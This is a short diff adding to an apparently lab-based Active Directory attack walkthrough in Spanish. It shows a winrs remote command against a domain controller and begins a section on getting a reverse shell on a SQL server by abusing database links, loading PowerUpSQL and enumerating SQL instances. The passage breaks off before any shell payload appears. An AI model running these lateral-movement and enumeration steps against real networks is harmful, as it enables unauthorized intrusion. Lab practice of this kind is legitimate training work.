@@ -1504,3 +1504,17 @@ Comprobamos que podemos acceder
 ```shell
 winrs -r:mcorp-dc cmd /c set username
 ```
+
+*LO - 22*
+Obtener una Reverse shell en un servidor SQL en el bosque *eurocorp* abusando de los enlaces de bases de datos
+Cargaremos el modulo para enumerar servidores SQL y si nuestra maquina tiene privilegios para conectarse a ellos.
+```shell
+Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+```
+
+Y ejecutaremos la herramienta
+```shell
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+```
+
+Encontramos que hay un servicio llamado *dcorp-mssql.dollarcorp.moneycorp.local*,
